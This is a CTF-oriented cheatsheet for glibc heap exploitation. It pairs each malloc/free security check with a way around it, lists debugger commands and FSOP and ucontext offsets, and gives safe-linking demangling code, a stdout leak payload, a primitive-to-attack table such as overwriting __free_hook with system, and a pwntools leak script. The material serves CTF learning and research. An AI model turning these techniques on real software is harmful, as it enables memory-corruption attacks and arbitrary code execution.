---
title: "glibc Heap - Command and Constraint Cheatsheet"
category: pwn
subcategory: heap
type: cheatsheet
tags: [heap, glibc, malloc, free, tcache, fastbin, unsorted-bin, largebin, chunk-size, security-checks, pwndbg, gef, free-hook, one-gadget, pwntools, uaf, double-free, fsop, safe-linking]
summary: "Chunk math, bin ranges, every malloc/free security check and what trips it, pwndbg/gef commands, and a primitive-to-attack lookup table."
tools: [pwndbg, gef, pwntools, one-gadget, pwninit, patchelf, seccomp-tools, libc-database]
related: [heap-internals-primer, heap-version-differences, heap-tcache-poisoning, heap-write-targets, heap-menu-template]
---

## Chunk size math

```python
# chunk size for malloc(req) on x86-64
chunksize = max(0x20, (req + 8 + 0xF) & ~0xF)
# largest request that still fits a given chunk size
max_req   = size - 8
# smallest request that produces a given chunk size
min_req   = size - 8 - 0xF          # e.g. 0x420 -> 0x409
```

```text
req 0x00-0x18 -> 0x20     req 0x59-0x68 -> 0x70     req 0x3F9-0x408 -> 0x410
req 0x19-0x28 -> 0x30     req 0x69-0x78 -> 0x80     req 0x409-0x418 -> 0x420  <- skips tcache
req 0x29-0x38 -> 0x40     req 0x79-0x88 -> 0x90     req 0x4F9-0x508 -> 0x510
req 0x39-0x48 -> 0x50     req 0xE9-0xF8 -> 0x100    req 0xFF9-0x1008 -> 0x1010
req 0x49-0x58 -> 0x60     req 0x1F9-0x208 -> 0x210
```

```text
malloc_chunk (x86-64)
  +0x00 prev_size      (valid only when the PREVIOUS chunk is free)
  +0x08 size           (low 3 bits: 1=PREV_INUSE 2=IS_MMAPPED 4=NON_MAIN_ARENA)
  +0x10 fd  / user data starts here (what malloc returns)
  +0x18 bk
  +0x20 fd_nextsize    (largebin only)
  +0x28 bk_nextsize    (largebin only)

tcache_entry              tcache_perthread_struct (2.30+, chunk size 0x290)
  +0x00 next               +0x00 counts[64]   (uint16)
  +0x08 key  (2.29+)       +0x90 entries[64]  (ptr)
```

## Bin ranges

```text
tcache      0x20 .. 0x410   64 bins, 7 entries each, singly linked (fd == next)
fastbins    0x20 .. 0x80    10 bins (global_max_fast = 0x80), singly linked
unsorted    any             one circular doubly-linked list, head = main_arena+0x60
smallbins   0x20 .. 0x3F0   62 bins, one exact size each, circular doubly linked
largebins   0x400 and up    ranges, sorted descending via fd_nextsize/bk_nextsize
top chunk   the remainder; never binned
mmap        req >= mp_.mmap_threshold (128KB, dynamic) -> IS_MMAPPED, munmap on free
```

```python
# bin index helpers
tcache_index   = (size - 0x20) // 0x10          # 0..63
fastbin_index  = (size >> 4) - 2                # 0..9
smallbin_index = (size // 0x10) - 2
```

## Security checks, and what each one means

```text
free(): invalid pointer
    p is not 16-byte aligned, or p > (uintptr_t)-size
    -> shift the fake chunk by 8

free(): invalid size
    size < 0x20 or size is not 16-byte aligned
    -> fix the fake size field

free(): invalid next size (fast)
    chunk_at_offset(p, size)->size not in (0x10, av->system_mem)
    -> write a plausible size at fake + size + 8; 0x21 always works

free(): invalid next size (normal)
    same check on the non-fastbin path after you grew a size
    -> your forged size lands on garbage; plant a header there

double free or corruption (fasttop)
    you freed the chunk that is currently the fastbin head
    -> interleave: free(A); free(B); free(A)

free(): double free detected in tcache 2      [2.29+]
    e->key == tcache_key AND the chunk is already in that tcache bin
    -> clear the key, fill the bin to 7, change the size, or use house of botcake

malloc(): memory corruption (fast)
    fastbin_index(chunksize(victim)) != idx
    -> the fake chunk's size must match the bin (0x7f trick)

malloc(): unaligned tcache chunk detected     [2.34+]
    the revealed next pointer is not 16-byte aligned
    -> pick an aligned target; the hook-0x23 trick is dead

malloc(): corrupted top size                  [2.29+]
    top->size > av->system_mem
    -> House of Force is dead from 2.29

malloc(): corrupted unsorted chunks 3         [2.29+]
    bck->fd != victim while unlinking from the unsorted bin
    -> unsorted bin attack is dead; use a largebin attack

malloc(): corrupted unsorted chunks           [2.30+]
    same check on the largebin insert path
    -> leave `bk` intact, use only bk_nextsize

corrupted size vs. prev_size                  [2.29+]
    chunksize(P) != prev_size(next_chunk(P)) during consolidation
    -> keep the two consistent; let free() write prev_size for you

corrupted double-linked list
    fd->bk != P or bk->fd != P during unlink
    -> self-pointers, or consolidate into a genuinely free chunk

malloc(): smallbin double linked list corrupted
    bck->fd != victim on the smallbin path

Fatal error: glibc detected an invalid stdio handle   [2.24+]
    a FILE vtable outside __libc_IO_vtables
    -> use _IO_wfile_jumps (house of apple)
```

## pwndbg

```text
# walk every chunk from the heap base
pwndbg> heap
# colour-coded hexdump of the first N chunks - the single most useful command
pwndbg> vis_heap_chunks 20
# all bins at once: tcache, fastbins, unsorted, small, large
pwndbg> bins
# just one of them
pwndbg> tcache
pwndbg> fastbins
pwndbg> unsortedbin
pwndbg> smallbins
pwndbg> largebins
# the arena fields: top, last_remainder, bins[], system_mem
pwndbg> arena
pwndbg> p main_arena
pwndbg> p/x (long)&main_arena + 0x60      # the unsorted bin head value
# the wilderness
pwndbg> top_chunk
# dry-run a free and print exactly which check would fail
pwndbg> try_free 0x555555757290
# find bytes that make a valid fastbin size in front of a target
pwndbg> find_fake_fast &__malloc_hook
pwndbg> find_fake_fast &__free_hook 0x70
# where is everything mapped
pwndbg> vmmap
pwndbg> libc
pwndbg> piebase
pwndbg> heapbase
# symbols you will want
pwndbg> p &__free_hook
pwndbg> p &__malloc_hook
pwndbg> p &_IO_2_1_stdout_
pwndbg> p &_IO_list_all
pwndbg> p &global_max_fast
pwndbg> p &mp_
pwndbg> p tcache_key
pwndbg> p *tcache
# watch a target
pwndbg> watch *(long*)&__free_hook
pwndbg> b malloc_printerr
```

## gef

```text
gef> heap chunks
gef> heap chunk 0x555555757290
gef> heap bins
gef> heap bins tcache
gef> heap bins fast
gef> heap bins unsorted
gef> heap bins small
gef> heap bins large
gef> heap arenas
gef> heap set-arena 0x7ffff7dcfb80
gef> heap-analysis-helper          # logs every malloc/free, flags UAF and double free
gef> vmmap
gef> got
gef> checksec
gef> search-pattern 0x00007ffff7
```

## Finding offsets without a debugger

```bash
# glibc version
strings ./libc.so.6 | grep -m1 "GNU C Library"
# do hooks still exist? (absent => 2.34+)
nm -D ./libc.so.6 | grep -E '__free_hook|__malloc_hook|__realloc_hook'
# main_arena, when exported
nm -D ./libc.so.6 | grep -E ' main_arena$'
# main_arena when it is NOT exported (2.23 - 2.33): it is __malloc_hook + 0x10
python3 -c "from pwn import ELF; l=ELF('./libc.so.6'); print(hex(l.sym['__malloc_hook']+0x10))"
# the unsorted-bin leak value is main_arena + 0x60
python3 -c "from pwn import ELF; l=ELF('./libc.so.6'); print(hex(l.sym['__malloc_hook']+0x70))"
# stdout, the FSOP entry points
nm -D ./libc.so.6 | grep -E '_IO_2_1_stdout_|_IO_list_all|_IO_wfile_jumps|_IO_file_jumps'
# is the target 16-byte aligned? (2.34+ requires it)
nm -D ./libc.so.6 | awk '$3=="_IO_2_1_stdout_"{print $1}'
# one_gadgets
one_gadget ./libc.so.6
one_gadget --raw ./libc.so.6
# what syscalls are allowed - decide system() vs ORW before you plan
seccomp-tools dump ./chal
# bind the binary to the challenge libc so your local heap matches remote
pwninit --bin ./chal --libc ./libc.so.6 --ld ./ld-2.35.so
patchelf --set-interpreter ./ld-2.35.so --replace-needed libc.so.6 ./libc.so.6 ./chal
# identify an unknown remote libc from a leak
# (upload the leak to libc.rip, or:)
./libc-database/find __libc_start_main_ret 0x7f1234567890
```

## Safe-linking arithmetic (2.32+)

```python
def mangle(pos, ptr):       # what to WRITE into a chunk at user address `pos`
    return (pos >> 12) ^ ptr

def demangle(val):          # recover a real pointer from a leaked mangled one
    mask, key = 0xFFF << 52, 0
    for _ in range(5):
        key |= ((key ^ val) & mask) >> 12
        mask >>= 12
    return key ^ val

# a bin with EXACTLY ONE entry stores (pos >> 12) ^ 0, i.e. the heap page number
heap_page = leak << 12
```

## `_IO_FILE` offsets (x86-64)

```text
_flags          0x00      _chain         0x68      _wide_data     0xa0
_IO_read_ptr    0x08      _fileno        0x70      _mode          0xc0
_IO_read_end    0x10      _flags2        0x74      vtable         0xd8
_IO_read_base   0x18      _old_offset    0x78
_IO_write_base  0x20      _lock          0x88      _IO_wide_data:
_IO_write_ptr   0x28      _offset        0x90        _IO_write_base 0x18
_IO_write_end   0x30      _codecvt       0x98        _IO_write_ptr  0x20
_IO_buf_base    0x38                                 _IO_buf_base   0x30
_IO_buf_end     0x40      vtable+0x18 = __overflow   _wide_vtable   0xe0
                                                     wide_vt+0x68 = __doallocate
```

```python
# stdout partial overwrite -> libc leak with no prior leak (33 bytes)
payload = p64(0xFBAD1800) + p64(0)*3 + p8(0x00)
```

## ucontext offsets for setcontext

```text
R8 0x28  R9 0x30  R12 0x48  R13 0x50  R14 0x58  R15 0x60
RDI 0x68 RSI 0x70 RBP 0x78 RBX 0x80 RDX 0x88 RAX 0x90 RCX 0x98
RSP 0xa0 RIP 0xa8    fpregs 0xe0  (MUST be 0)

setcontext+53  -> reads from rdi   (glibc <= 2.28)
setcontext+61  -> reads from rdx   (glibc >= 2.29)
magic gadget   -> mov rdx, [rdi+8] ; mov [rsp], rax ; call [rdx+0x20]
```

## Primitive -> attack lookup

```text
I have                                   -> use
---------------------------------------------------------------------------
UAF read on a freed chunk                -> unsorted leak (libc), tcache next (heap)
UAF write of 8 bytes                     -> tcache poisoning
UAF write of 16 bytes                    -> tcache poisoning + clear the key
double free, glibc < 2.29                -> tcache dup
double free, glibc >= 2.29, have edit    -> clear e->key, then tcache dup
double free, glibc >= 2.29, no edit      -> house of botcake
double free, calloc-only allocations     -> fastbin dup (fill tcache first)
heap overflow, 8 bytes                   -> grow/shrink the next size -> overlap
heap overflow, 16+ bytes into a free chunk -> tcache poisoning through the neighbour
off-by-one NULL byte                     -> poison null byte, or house of einherjar
off-by-one non-NULL                      -> grow the next size -> overlap
free() on a pointer I control            -> house of spirit
no free() at all, can overflow top       -> house of force (<=2.28), house of orange (2.23)
arbitrary index into a global ptr array  -> fake chunk in .bss, write through the menu
need libc, size is free                  -> malloc(0x418) + guard, free, show
need libc, size is fixed and small       -> fill tcache with 7, free the 8th, show
need heap base, glibc >= 2.32            -> free ONE chunk, show -> (heap >> 12)
need a big value written somewhere       -> unsorted bin attack (<=2.28) / largebin attack
need a heap pointer written somewhere    -> largebin attack (bk_nextsize)
arbitrary write, glibc <= 2.33           -> __free_hook = system, free("/bin/sh")
arbitrary write, glibc <= 2.33, seccomp  -> __free_hook = setcontext+61 + fake ucontext
arbitrary write, glibc >= 2.34           -> FSOP (house of apple) or __exit_funcs
arbitrary write, Partial RELRO           -> GOT[atoi] = system
write but NO read                        -> _IO_2_1_stdout_ _flags + write_base low byte
heap pointer write only                  -> _IO_list_all (largebin attack) -> FSOP
```

## Quick triage on a new binary

```bash
# 1. what am I dealing with
file ./chal && checksec --file=./chal
strings ./libc.so.6 | grep -m1 "GNU C Library"
seccomp-tools dump ./chal
# 2. bind to the right loader
pwninit --bin ./chal --libc ./libc.so.6 --ld ./ld.so
# 3. which primitives does the menu give me
#    look for: free without NULLing, edit with a stale size, show on a freed index,
#    an index that is not bounds-checked, an allocation size the user picks
# 4. fingerprint the allocator
#    malloc(0x18); free; show  -> small value  => safe-linking => 2.32+
#                              -> raw heap ptr => <= 2.31
#    free twice -> "double free detected in tcache 2" => 2.29+
# 5. get the leaks, then pick from the table above
```

## Common one-liners

```bash
# extract every gadget once, grep later
ROPgadget --binary ./libc.so.6 > gadgets.txt
grep -m3 ': pop rdi ; ret' gadgets.txt
# find the setcontext magic gadget
ROPgadget --binary ./libc.so.6 --re "mov rdx, qword ptr \[rdi" | head
# /bin/sh in libc
python3 -c "from pwn import ELF; l=ELF('./libc.so.6'); print(hex(next(l.search(b'/bin/sh\0'))))"
# does this libc have the 2.29 hardening?
strings ./libc.so.6 | grep -c "corrupted unsorted chunks 3"
# dump the tcache struct from a core file
gdb -q ./chal core -ex 'p *tcache' -ex quit
```

## pwntools boilerplate

```python
from pwn import *

context.binary = elf = ELF("./chal", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
io = remote(args.HOST, int(args.PORT)) if args.REMOTE else process([elf.path])

def menu(c):   io.sendlineafter(b"> ", str(c).encode())
def alloc(i, n, d=b"A"):
    menu(1); io.sendlineafter(b"index: ", str(i).encode())
    io.sendlineafter(b"size: ", str(n).encode()); io.sendafter(b"content: ", d)
def free(i):   menu(2); io.sendlineafter(b"index: ", str(i).encode())
def show(i):
    menu(3); io.sendlineafter(b"index: ", str(i).encode())
    io.recvuntil(b"content: "); return u64(io.recvline().rstrip().ljust(8, b"\x00")[:8])
def edit(i, d):
    menu(4); io.sendlineafter(b"index: ", str(i).encode()); io.sendafter(b"content: ", d)

# the standard opening: 0x418 skips tcache, guard keeps it off top
alloc(0, 0x418); alloc(1, 0x18); free(0)
libc.address = show(0) - 0x60 - libc.sym["main_arena"]
log.success("libc @ %#x", libc.address)
```
